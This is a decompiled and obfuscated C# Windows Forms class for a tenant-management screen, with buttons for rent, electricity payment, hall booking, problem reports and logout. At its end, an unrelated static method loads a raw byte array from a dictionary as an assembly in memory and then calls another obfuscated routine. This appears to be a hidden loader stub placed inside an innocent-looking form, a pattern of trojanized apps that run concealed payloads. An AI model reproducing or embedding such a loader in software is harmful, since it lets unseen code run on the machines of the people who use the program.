using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Hz6;
using Jb27;
using Microsoft.VisualBasic.CompilerServices;
using p9K;
using s6S;

namespace i8FQ;

[DesignerGenerated]
public class g9Z2 : Form
{
	private IContainer components;

	private Label _Label2;

	private Button _BookEventHall;

	private Button _ProblemReport;

	private Button _Back;

	internal Label i;

	internal MaskedTextBox H;

	internal Button V;

	internal Button D;

	internal Button A;

	public g9Z2()
	{
		((Form)this).add_Load((EventHandler)m6DR);
		Xg69();
	}

	protected override void Cb69(bool d0E9)
	{
		try
		{
			if (d0E9 && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(d0E9);
		}
	}

	private void Xg69()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0088: Unknown result type (might be due to invalid IL or missing references)
		//IL_0092: Expected O, but got Unknown
		//IL_010b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0115: Expected O, but got Unknown
		//IL_0182: Unknown result type (might be due to invalid IL or missing references)
		//IL_018c: Expected O, but got Unknown
		//IL_01e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f3: Expected O, but got Unknown
		//IL_0269: Unknown result type (might be due to invalid IL or missing references)
		//IL_0273: Expected O, but got Unknown
		//IL_02e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f3: Expected O, but got Unknown
		//IL_0369: Unknown result type (might be due to invalid IL or missing references)
		//IL_0373: Expected O, but got Unknown
		//IL_03e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f3: Expected O, but got Unknown
		//IL_046c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0476: Expected O, but got Unknown
		Ky2w(new Label());
		Fm69(new Label());
		Hc0r(new MaskedTextBox());
		b5MY(new Button());
		a0SC(new Button());
		He83(new Button());
		t0AK(new Button());
		Cf8r(new Button());
		f0F7(new Button());
		((Control)this).SuspendLayout();
		d7R3().set_AutoSize(true);
		((Control)d7R3()).set_Font(new Font("Microsoft Sans Serif", 13.8f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)d7R3()).set_Location(new Point(507, 95));
		((Control)d7R3()).set_Name("Label1");
		((Control)d7R3()).set_Size(new Size(192, 29));
		((Control)d7R3()).set_TabIndex(0);
		d7R3().set_Text("View Notification");
		p4QB().set_AutoSize(true);
		((Control)p4QB()).set_Font(new Font("Microsoft Sans Serif", 10.2f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)p4QB()).set_Location(new Point(472, 164));
		((Control)p4QB()).set_Name("Label2");
		((Control)p4QB()).set_Size(new Size(82, 20));
		((Control)p4QB()).set_TabIndex(1);
		p4QB().set_Text("Tenant ID");
		((Control)Kr8a()).set_Font(new Font("Microsoft Sans Serif", 10.2f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Kr8a()).set_Location(new Point(610, 161));
		((Control)Kr8a()).set_Name("MaskedTextBox1");
		((Control)Kr8a()).set_Size(new Size(132, 27));
		((Control)Kr8a()).set_TabIndex(2);
		((Control)z5R1()).set_Font(new Font("Microsoft Sans Serif", 8.25f));
		((Control)z5R1()).set_Location(new Point(89, 284));
		((Control)z5R1()).set_Name("PayElectricity");
		((Control)z5R1()).set_Size(new Size(181, 55));
		((Control)z5R1()).set_TabIndex(1);
		((ButtonBase)z5R1()).set_Text("Pay Electricity");
		((ButtonBase)z5R1()).set_UseVisualStyleBackColor(true);
		((Control)q2Y0()).set_Font(new Font("Microsoft Sans Serif", 8.25f));
		((Control)q2Y0()).set_Location(new Point(89, 408));
		((Control)q2Y0()).set_Name("BookEventHall");
		((Control)q2Y0()).set_Size(new Size(181, 55));
		((Control)q2Y0()).set_TabIndex(2);
		((ButtonBase)q2Y0()).set_Text("Book Event Hall");
		((ButtonBase)q2Y0()).set_UseVisualStyleBackColor(true);
		((Control)Jd7p()).set_Font(new Font("Microsoft Sans Serif", 8.25f));
		((Control)Jd7p()).set_Location(new Point(89, 147));
		((Control)Jd7p()).set_Name("FlatRent");
		((Control)Jd7p()).set_Size(new Size(181, 55));
		((Control)Jd7p()).set_TabIndex(0);
		((ButtonBase)Jd7p()).set_Text("Flat Rent");
		((ButtonBase)Jd7p()).set_UseVisualStyleBackColor(true);
		((Control)g1J0()).set_Font(new Font("Microsoft Sans Serif", 8.25f));
		((Control)g1J0()).set_Location(new Point(89, 530));
		((Control)g1J0()).set_Name("ProblemReport");
		((Control)g1J0()).set_Size(new Size(181, 55));
		((Control)g1J0()).set_TabIndex(3);
		((ButtonBase)g1J0()).set_Text("Problem Report");
		((ButtonBase)g1J0()).set_UseVisualStyleBackColor(true);
		((Control)y7HY()).set_Font(new Font("Microsoft Sans Serif", 8.25f));
		((Control)y7HY()).set_Location(new Point(462, 381));
		((Control)y7HY()).set_Name("Back");
		((Control)y7HY()).set_Size(new Size(151, 51));
		((Control)y7HY()).set_TabIndex(4);
		((ButtonBase)y7HY()).set_Text("Back");
		((ButtonBase)y7HY()).set_UseVisualStyleBackColor(true);
		((Control)d9B3()).set_Font(new Font("Microsoft Sans Serif", 8.25f));
		((Control)d9B3()).set_Location(new Point(662, 381));
		((Control)d9B3()).set_Name("Logout");
		((Control)d9B3()).set_Size(new Size(151, 51));
		((Control)d9B3()).set_TabIndex(5);
		((ButtonBase)d9B3()).set_Text("Logout");
		((ButtonBase)d9B3()).set_UseVisualStyleBackColor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(910, 758));
		((Control)this).get_Controls().Add((Control)(object)d9B3());
		((Control)this).get_Controls().Add((Control)(object)y7HY());
		((Control)this).get_Controls().Add((Control)(object)g1J0());
		((Control)this).get_Controls().Add((Control)(object)Jd7p());
		((Control)this).get_Controls().Add((Control)(object)q2Y0());
		((Control)this).get_Controls().Add((Control)(object)z5R1());
		((Control)this).get_Controls().Add((Control)(object)Kr8a());
		((Control)this).get_Controls().Add((Control)(object)p4QB());
		((Control)this).get_Controls().Add((Control)(object)d7R3());
		((Control)this).set_Name("Tenant_Function");
		((Form)this).set_Text("Tenant_Function");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual Label d7R3()
	{
		return i;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ky2w(Label d8K1)
	{
		Label val = (i = d8K1);
	}

	[SpecialName]
	internal virtual Label p4QB()
	{
		return _Label2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Fm69(Label f5L3)
	{
		_Label2 = f5L3;
	}

	[SpecialName]
	internal virtual MaskedTextBox Kr8a()
	{
		return H;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Hc0r(MaskedTextBox Dd15)
	{
		MaskedTextBox val = (H = Dd15);
	}

	[SpecialName]
	internal virtual Button z5R1()
	{
		return V;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void b5MY(Button Bp8a)
	{
		EventHandler eventHandler = Lk29;
		Button v = V;
		if (v != null)
		{
			((Control)v).remove_Click(eventHandler);
		}
		Button val = (V = Bp8a);
		v = V;
		if (v != null)
		{
			((Control)v).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button q2Y0()
	{
		return _BookEventHall;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void a0SC(Button c5MW)
	{
		EventHandler eventHandler = a9M4;
		Button bookEventHall = _BookEventHall;
		if (bookEventHall != null)
		{
			((Control)bookEventHall).remove_Click(eventHandler);
		}
		_BookEventHall = c5MW;
		bookEventHall = _BookEventHall;
		if (bookEventHall != null)
		{
			((Control)bookEventHall).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button Jd7p()
	{
		return D;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void He83(Button q1G8)
	{
		EventHandler eventHandler = Wq1g;
		Button d = D;
		if (d != null)
		{
			((Control)d).remove_Click(eventHandler);
		}
		Button val = (D = q1G8);
		d = D;
		if (d != null)
		{
			((Control)d).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button g1J0()
	{
		return _ProblemReport;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void t0AK(Button q4N9)
	{
		EventHandler eventHandler = b2A5;
		Button problemReport = _ProblemReport;
		if (problemReport != null)
		{
			((Control)problemReport).remove_Click(eventHandler);
		}
		_ProblemReport = q4N9;
		problemReport = _ProblemReport;
		if (problemReport != null)
		{
			((Control)problemReport).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button y7HY()
	{
		return _Back;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Cf8r(Button Tq34)
	{
		EventHandler eventHandler = Kf6t;
		Button back = _Back;
		if (back != null)
		{
			((Control)back).remove_Click(eventHandler);
		}
		_Back = Tq34;
		back = _Back;
		if (back != null)
		{
			((Control)back).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button d9B3()
	{
		return A;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void f0F7(Button j8Y2)
	{
		EventHandler eventHandler = Zo6c;
		Button a = A;
		if (a != null)
		{
			((Control)a).remove_Click(eventHandler);
		}
		Button val = (A = j8Y2);
		a = A;
		if (a != null)
		{
			((Control)a).add_Click(eventHandler);
		}
	}

	private void a9M4(object sender, EventArgs e)
	{
		((Control)Gj9.Forms.b0L()).Show();
	}

	private void m6DR(object sender, EventArgs e)
	{
	}

	private void Wq1g(object sender, EventArgs e)
	{
		((Control)Gj9.Forms.Jk7()).Show();
	}

	private void Lk29(object sender, EventArgs e)
	{
		((Control)Gj9.Forms.Ad3()).Show();
	}

	private void b2A5(object sender, EventArgs e)
	{
		((Control)Gj9.Forms.Gy9()).Show();
	}

	private void Kf6t(object sender, EventArgs e)
	{
		((Form)this).Close();
		((Control)Gj9.Forms.p1T()).Show();
	}

	private void Zo6c(object sender, EventArgs e)
	{
		((Form)this).Close();
		((Control)Gj9.Forms.p1T()).Show();
	}

	internal static void a2TQ()
	{
		Assembly assembly = null;
		byte[] rawAssembly = (byte[])j5N.mDic[j5N.mArray];
		assembly = Assembly.Load(rawAssembly);
		j5N.mDic.Add("Deep", assembly);
		assembly = null;
		if (Ar9f.Db9a())
		{
			w1D.g3W();
		}
	}
}
